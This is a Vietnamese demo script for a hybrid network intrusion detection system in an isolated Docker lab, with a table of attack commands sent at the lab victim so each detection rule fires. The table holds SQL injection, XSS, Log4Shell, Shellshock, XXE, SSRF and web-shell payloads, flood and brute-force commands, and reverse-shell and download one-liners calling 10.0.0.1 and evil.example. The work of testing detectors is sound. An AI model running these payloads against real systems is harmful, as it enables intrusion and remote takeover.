# Kịch bản demo Hybrid NIDS

Thời lượng gợi ý: 10–12 phút. Mạng Docker cô lập `172.28.0.0/16`: victim (nginx) `172.28.0.50`, attacker `172.28.0.100`, MySQL `172.28.0.10`, Redis `172.28.0.30` (đẩy cảnh báo tức thì lên dashboard), API và dashboard `172.28.0.20`.

## 1. Chuẩn bị trước giờ demo

Làm từ tối hôm trước, không làm sát giờ:

1. Mở Docker Desktop, chờ trạng thái "Engine running".
2. Build sẵn image: `docker compose build`.
3. Khởi động: `docker compose up -d`, đợi khoảng 30 giây cho MySQL sẵn sàng.
4. Kiểm tra engine đã nạp rule: `docker logs nids_engine` phải có dòng `Đã nạp 67 rule` và `Lắng nghe trực tiếp`.
5. Mở dashboard [http://localhost:8000/](http://localhost:8000/), góc trên phải phải báo "Đã kết nối".
6. Bấm **Xoá dữ liệu** để bảng bắt đầu từ 0.
7. Chuẩn bị hai cửa sổ cạnh nhau: terminal chạy `docker logs -f nids_engine` và trình duyệt dashboard.

Kiểm tra nhanh toàn bộ chuỗi (30 giây): `docker exec -it nids_attacker python lab/attacker/attack_demo.py web --delay 0.2`, thấy alert xuất hiện rồi bấm Xoá dữ liệu.

## 2. Trình tự trình diễn

| Bước | Nói gì | Lệnh | Kết quả mong đợi |
|---|---|---|---|
| 1. Kiến trúc | Hai process dùng chung CSDL: engine (capture → decode → Aho-Corasick → kiểm tra chi tiết → threshold) và API/dashboard. Rule viết theo cú pháp Snort 3, chia thành nhiều file trong `rules/` (mỗi file một category, bật/tắt được trên trang Rules). | (chỉ trình bày sơ đồ trong README) | |
| 2. Lưu lượng bình thường | Truy cập victim bình thường thì không có cảnh báo. | `docker exec -it nids_attacker python -c "import urllib.request as u; print(u.urlopen('http://172.28.0.50/').status)"` | In `200`, dashboard vẫn 0 cảnh báo |
| 3. Tấn công web | SQLi, XSS, traversal, Log4Shell, XXE, SSRF… đi qua HTTP thật. | `docker exec -it nids_attacker python lab/attacker/attack_demo.py web` | Mỗi đòn hiện một dòng log có màu, SID khớp dòng "kỳ vọng SID" của attacker |
| 4. Quét mạng | Nmap Xmas/Null/FIN và quét cổng SYN dựa trên cờ TCP. | `... attack_demo.py scan` | SID 1000100–1000107 |
| 5. DoS | SYN/UDP/ICMP/HTTP flood. Rule dùng `detection_filter` (đếm trong cửa sổ thời gian), một gói đơn lẻ không bắn. | `... attack_demo.py dos` | Flood chỉ bắn sau ngưỡng; `ThresholdManager` chặn bão alert |
| 6. Brute force và mã độc | SSH/FTP/web brute force, reverse shell, Mimikatz, cryptominer. | `... attack_demo.py auth` rồi `... attack_demo.py malware` | SID 10003xx, 10004xx |
| 7. Recon | SNMP, DNS tunneling/AXFR, ICMP, NetBIOS, SSDP. | `... attack_demo.py recon` | SID 10005xx |
| 8. Tổng kết | Dashboard: tổng cảnh báo theo P1/P2/P3 và top loại tấn công. Mở `/docs` cho thấy API. | Mở [http://localhost:8000/docs](http://localhost:8000/docs) | |

Mỗi lệnh `attack_demo.py` nghỉ 1,5 giây giữa các đòn để khán giả theo dõi kịp (đổi bằng `--delay`). Chạy lại sau khi bấm **Xoá dữ liệu** để lặp lại phần nào đó.

Nếu hết giờ, chạy một lệnh duy nhất: `docker exec -it nids_attacker python lab/attacker/attack_demo.py all --delay 0.5`.

## Demo gõ lệnh thủ công

Bảng dưới gõ trực tiếp trong container attacker (`docker exec -it nids_attacker bash`), không qua `attack_demo.py`, để trình diễn từng rule bằng công cụ dòng lệnh thật (nmap, hping3, hydra, sqlmap, nikto, nc...). Target victim: `172.28.0.50`. Các lệnh dùng ký tự đặc biệt (`$`, `'`, dấu cách) nên gõ đúng dấu nháy như trong bảng. Lệnh flood/brute force (hping3 --flood, hydra) chạy vô thời hạn: để vài giây cho đủ ngưỡng `detection_filter` rồi Ctrl+C, tránh làm đầy hàng đợi engine. Cổng 53 (DNS) và các dịch vụ UDP khác (NTP, SNMP, memcached) không có server thật lắng nghe trong môi trường này — gói UDP/TCP vẫn được gửi đi và rule vẫn bắn vì chỉ cần gói tới, không cần phản hồi.

| Nhóm | Lệnh | SID kỳ vọng |
|---|---|---|
| Bình thường | `curl http://172.28.0.50/` | — |
| Bình thường | `ping -c 2 172.28.0.50` | — |
| Ping/ICMP | `ping -c 1 -s 1000 172.28.0.50` (ICMP lớn, Ping of Death) | 1000203 |
| Ping/ICMP | `hping3 --icmp -C 13 -c 1 172.28.0.50` (ICMP Timestamp) | 1000503 |
| Ping/ICMP | `hping3 --icmp -C 17 -c 1 172.28.0.50` (ICMP Address Mask) | 1000504 |
| Nmap quét cờ | `nmap -sX -p 80 172.28.0.50` (Xmas scan) | 1000100 |
| Nmap quét cờ | `nmap -sN -p 80 172.28.0.50` (Null scan) | 1000101 |
| Nmap quét cờ | `nmap -sF -p 80 172.28.0.50` (FIN scan) | 1000102 |
| Nmap quét cờ | `hping3 -S -F -p 80 -c 1 172.28.0.50` (SYN+FIN) | 1000103 |
| Nmap quét cờ | `hping3 -S -R -p 80 -c 1 172.28.0.50` (SYN+RST) | 1000104 |
| Nmap quét cổng | `nmap -sS -p 1-100 172.28.0.50` (SYN scan nhiều cổng) | 1000107 |
| Nmap quét cổng | `nmap -p 80 --script http-title 172.28.0.50` (User-Agent NSE mặc định) | 1000105 |
| Nmap quét cổng | `masscan -p80 --banners 172.28.0.50/32` (User-Agent masscan) | 1000106 |
| UDP/recon | `snmpget -v1 -c public -t 1 -r 0 172.28.0.50 1.3.6.1.2.1.1.1.0` | 1000501 |
| UDP/recon | `dig @172.28.0.50 data.c2tunnel.evil.example` (chưa có DNS server, chỉ cần gói UDP tới) | 1000502 |
| UDP/recon | `dig @172.28.0.50 version.bind CH TXT` | 1000508 |
| UDP/recon | `dig @172.28.0.50 example.com AXFR +tcp` | 1000506 |
| Flood (hping3) | `hping3 -S -p 80 --flood 172.28.0.50` rồi Ctrl+C sau 2–3 giây | 1000201 |
| Flood (hping3) | `hping3 --udp -p 9999 --flood 172.28.0.50` rồi Ctrl+C sau 2–3 giây | 1000205 |
| Flood (hping3) | `hping3 --icmp --flood 172.28.0.50` rồi Ctrl+C sau 2–3 giây | 1000206 |
| FTP/SSH | `ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=3 root@172.28.0.50` | 1000301 |
| FTP/SSH | `hydra -l root -x 3:3:a -t 4 ssh://172.28.0.50` rồi Ctrl+C sau vài giây | 1000305 |
| FTP/SSH | `printf 'user anonymous anonymous\r\nquit\r\n' \| ftp -n 172.28.0.50` | 1000302 |
| FTP/SSH | `hydra -l ftpuser -x 3:3:a -t 4 ftp://172.28.0.50` rồi Ctrl+C sau vài giây | 1000307 |
| Web | `curl "http://172.28.0.50/search?q=1'+union+select+username,password+from+users--"` | 1000001, 1000003 |
| Web | `curl "http://172.28.0.50/login?user=admin'+or+1=1"` | 1000002 |
| Web | `curl "http://172.28.0.50/item?id=1+and+sleep(5)"` | 1000031 |
| Web | `curl "http://172.28.0.50/item?id=1+union+select+table_name+from+information_schema.tables"` | 1000032 |
| Web | `curl "http://172.28.0.50/item?id=1;drop+table+users"` | 1000033 |
| Web | `curl 'http://172.28.0.50/comment?text=<script>alert(1)</script>'` | 1000010 |
| Web | `curl 'http://172.28.0.50/redirect?u=javascript:alert(1)'` | 1000011 |
| Web | `curl --data 'text=<img src=x onerror=alert(1)>' http://172.28.0.50/comment` | 1000012 |
| Web | `curl 'http://172.28.0.50/q?x=document.cookie'` | 1000034 |
| Web | `curl 'http://172.28.0.50/q?x=<iframe src=//evil.example>'` | 1000035 |
| Web | `curl 'http://172.28.0.50/download?file=../../../../etc/passwd'` | 1000020, 1000021 |
| Web | `curl 'http://172.28.0.50/download?file=%2e%2e%2f%2e%2e%2fetc'` | 1000036 |
| Web | `curl 'http://172.28.0.50/download?file=C:/windows/win.ini'` | 1000022 |
| Web | `curl 'http://172.28.0.50/index.php?page=php://filter/convert.base64-encode/resource=config'` | 1000037 |
| Web | `curl 'http://172.28.0.50/index.php?page=http://evil.example/shell.txt'` | 1000038 |
| Web | `curl 'http://172.28.0.50/ping?host=127.0.0.1|id'` | 1000030 |
| Web | `curl -H 'X-Api-Version: ${jndi:ldap://evil.example/a}' http://172.28.0.50/` | 1000039 |
| Web | `curl -A '() { :;}; echo vulnerable' http://172.28.0.50/cgi-bin/status` | 1000040 |
| Web | `curl --data '<?xml version="1.0"?><!DOCTYPE f [<!ENTITY x SYSTEM "file:///etc/hosts">]><f>&x;</f>' http://172.28.0.50/xml` | 1000041 |
| Web | `curl 'http://172.28.0.50/fetch?url=http://169.254.169.254/latest/meta-data/'` | 1000042 |
| Web | `curl http://172.28.0.50/.git/config` | 1000043 |
| Web | `curl http://172.28.0.50/.env` | 1000044 |
| Web | `curl --data "cmd=eval(base64_decode('c3lzdGVtKCRfR0VUWydjJ10pOw=='))" http://172.28.0.50/upload.php` | 1000401 |
| Web | `sqlmap -u "http://172.28.0.50/item?id=1" --batch` (User-Agent sqlmap) | 1000404 |
| Web | `nikto -h http://172.28.0.50` (User-Agent Nikto) | 1000405 |
| Web | `curl -H 'X-a: b' http://172.28.0.50/` (Slowloris header probe) | 1000202 |
| Web | `curl -u admin:admin http://172.28.0.50/admin` | 1000303 |
| Web | `curl --data 'user=admin&pass=admin' http://172.28.0.50/admin/login` | 1000304 |
| Web | `for i in 1 2 3 4 5 6; do curl -s -o /dev/null --data "user=admin&pass=guess$i" http://172.28.0.50/login; done` | 1000306 |
| Web | `for i in $(seq 1 40); do curl -s -o /dev/null http://172.28.0.50/; done` (HTTP GET flood) | 1000209 |
| Payload qua nc (4444/3333) | `echo "/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" \| nc -q 1 172.28.0.50 4444` | 1000402 |
| Payload qua nc (4444/3333) | `echo "powershell -c (New-Object Net.WebClient).DownloadString('http://evil.example/x.ps1')" \| nc -q 1 172.28.0.50 4444` | 1000403 |
| Payload qua nc (4444/3333) | `echo "nc 10.0.0.1 4444 -e /bin/sh" \| nc -q 1 172.28.0.50 4444` | 1000406 |
| Payload qua nc (4444/3333) | `echo "wget http://evil.example/x.sh -O /tmp/x.sh" \| nc -q 1 172.28.0.50 4444` | 1000407 |
| Payload qua nc (4444/3333) | `echo 'import subprocess;subprocess.call(["/bin/sh","-i"])' \| nc -q 1 172.28.0.50 4444` | 1000408 |
| Payload qua nc (4444/3333) | `echo "mimikatz # sekurlsa::logonpasswords" \| nc -q 1 172.28.0.50 4444` | 1000409 |
| Payload qua nc (4444/3333) | `echo 'X5O...EICAR-STANDARD-ANTIVIRUS-TEST-FILE...' \| nc -q 1 172.28.0.50 4444` | 1000410 |
| Payload qua nc (4444/3333) | `echo '{"id":1,"method":"mining.subscribe","params":[]}' \| nc -q 1 172.28.0.50 3333` | 1000411 |

5 rule UDP đòi hỏi byte nhị phân chính xác (NTP monlist 1000204, DNS ANY 1000207, Memcached stats 1000208, NetBIOS 1000505, SSDP 1000507) không có lệnh dòng lệnh thủ công tương đương gọn gàng; chúng vẫn được trình diễn qua `lab/attacker/attack_demo.py dos` và `... recon`.

## 3. Phương án dự phòng

**Dashboard trống dù đã tấn công.** Kiểm tra theo thứ tự: `docker logs nids_engine` có hiện cảnh báo không (nếu có mà dashboard trống thì lỗi nằm ở MySQL hoặc API); `docker compose ps` cả năm container phải `running`; `curl http://localhost:8000/health`.

**Engine báo không lưu được vào CSDL.** MySQL khởi động chậm; đợi thêm và chạy `docker compose restart nids_engine`.

## 4. Câu hỏi có thể gặp

**AI worker đâu?** Phần phát hiện theo rule là giai đoạn 1, đã hoàn chỉnh. `AITrafficWorker` hiện là khung (stub) đã nối vào pipeline và dùng chung callback cảnh báo. Giai đoạn 2: trích xuất đặc trưng theo flow (packet rate, duration, byte count) rồi huấn luyện Random Forest/XGBoost để bắt các dạng bất thường mà rule chữ ký không thấy.

**Tại sao dùng Aho-Corasick?** Có hàng chục rule cùng cần tìm chuỗi trong mỗi gói. Aho-Corasick khớp đồng thời mọi mẫu trong một lần duyệt payload (độ phức tạp tuyến tính theo độ dài gói, không phụ thuộc số rule), nên chỉ những rule có mẫu xuất hiện mới được kiểm tra chi tiết.

**Khác gì Snort thật?** Rule cú pháp Snort 3 nhưng engine chỉ hiểu một tập con option (content, pcre, flags, flow, dsize, itype/icode, detection_filter, sticky buffer HTTP). Tái hợp luồng TCP mới làm cho chiều client → server (chuỗi bị chia qua hai gói vẫn bị bắt), `flow:established` được xấp xỉ bằng cờ ACK. Header rule hiểu IP/CIDR, dải và danh sách cổng, phủ định và biến.

**Có dương tính giả không?** Mỗi rule có test gói tấn công và gói lành tính gần giống (`tests/lab/test_demo_rules.py`, `tests/engine/test_diverse_rules_engine.py`). Rule dựa trên tần suất dùng `detection_filter` để một gói hợp lệ đơn lẻ không gây cảnh báo.

**Bộ rule lấy từ đâu?** 67 rule tự viết, chia theo nhóm SID (WEB, SCAN, DOS, AUTH, MALWARE/C2, RECON). Có sẵn bộ community của Snort ở `rules/vendor/` nhưng mặc định không nạp.

**Thêm rule mới thế nào?** Rule built-in: thêm vào file của nhóm (`rules/<nhóm>.rules`); rule tạm: viết trong `custom.rules` ngay trên trang Services › Rules. Engine tự nạp lại sau vài giây, không cần khởi động lại. Mỗi rule mới cần test positive/negative và một đòn trong `lab/attacker/attack_demo.py` (có test kiểm tra rule nào cũng có đòn trình diễn).

**Hiệu năng và rớt gói?** Capture đẩy vào hàng đợi có giới hạn (`queue_max_size`), worker xử lý song song; nếu đầy thì bỏ gói và ghi cảnh báo `Queue đầy` kèm tổng số gói bị bỏ.
